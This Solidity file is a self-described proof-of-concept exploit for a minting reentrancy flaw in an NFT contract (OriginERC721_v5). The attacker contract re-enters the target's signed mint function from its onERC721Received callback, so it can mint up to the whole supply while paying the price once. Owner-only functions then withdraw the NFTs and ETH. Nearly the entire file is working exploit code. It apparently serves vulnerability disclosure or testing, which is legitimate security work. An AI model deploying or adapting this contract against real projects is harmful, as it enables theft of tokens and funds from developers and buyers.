// SPDX-License-Identifier: MIT
/**
 * Proof of concept exploit for minting reentrancy
 */
pragma solidity ^0.8.0;

interface IOriginERC721_v5 {
    function maxSupply() external returns (uint256);

    function totalSupply() external returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function mint(
        address to,
        uint256 count,
        uint256 price,
        uint256 mintLimit,
        uint256 expires,
        bytes memory sig
    ) external payable;
}

contract Reentrancy_OriginERC721_v5 {
    struct MintCall {
        uint256 count;
        uint256 price;
        uint256 mintLimit;
        uint256 expires;
        bytes sig;
    }

    IOriginERC721_v5 token;
    address owner;
    uint256 public callsMade;
    uint256 public callsTarget;
    MintCall mintCall;

    constructor(address token_) {
        token = IOriginERC721_v5(token_);
        callsMade = 0;
        callsTarget = 0;
        owner = msg.sender;
    }

    function withdraw() public {
        require(msg.sender == owner, 'Who are you even');
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }('');
        require(success, 'Transfer failed');
    }

    function withdrawNFT(uint256 tokenId) public {
        require(msg.sender == owner, 'Who even are you');
        token.transferFrom(address(this), owner, tokenId);
    }

    function _mint() internal {
        require(callsMade < callsTarget, 'calls');
        require(address(token) != address(0));
        require(mintCall.count > 0);
        require(mintCall.price >= 0);
        require(mintCall.mintLimit >= 0);
        require(mintCall.expires >= 0);
        require(mintCall.sig.length >= 0);
        // value will not be sent on reentrancy
        require(address(this).balance >= mintCall.price, 'ETH');

        callsMade += 1;

        bytes memory data = abi.encodeWithSignature(
            'mint(address,uint256,uint256,uint256,uint256,bytes)',
            address(this), // Must mint to me to get the callback
            mintCall.count,
            mintCall.price,
            mintCall.mintLimit,
            mintCall.expires,
            mintCall.sig
        );
        (bool success, bytes memory returnData) = payable(address(token)).call{
            value: mintCall.price
        }(data);

        if (!success) {
            // To pass along the revert message (for debugging)
            assembly {
                revert(add(32, returnData), mload(returnData))
            }
        }
    }

    function mintAll(
        uint256 count,
        uint256 price,
        uint256 mintLimit,
        uint256 expires,
        bytes memory sig
    ) external payable {
        MintCall storage call = mintCall;
        call.count = count;
        call.price = price;
        call.mintLimit = mintLimit;
        call.expires = expires;
        call.sig = sig;
        // store
        mintCall = call;

        // May leave some remainder because lazy
        callsTarget = token.maxSupply() / count;
        return _mint();
    }

    function mintSome(
        uint256 runs,
        //address to,
        uint256 count,
        uint256 price,
        uint256 mintLimit,
        uint256 expires,
        bytes memory sig
    ) external payable {
        require(runs < token.maxSupply() - token.totalSupply(), 'Too much');
        MintCall storage call = mintCall;
        call.count = count;
        call.price = price;
        call.mintLimit = mintLimit;
        call.expires = expires;
        call.sig = sig;
        // store
        mintCall = call;

        callsTarget = runs;
        return _mint();
    }

    function onERC721Received(
        address minter,
        address from,
        uint256 tokenId,
        bytes memory _data
    ) external returns (bytes4) {
        // Silence compiler warnings
        require(minter != address(0));
        require(from == address(0));
        require(tokenId >= 0);
        require(_data.length >= 0);

        if (callsMade < callsTarget) {
            // Reentrancy
            _mint();
        }

        // selector onERC721Received(address,address,uint256,bytes)
        return bytes4(0x150b7a02);
    }
}
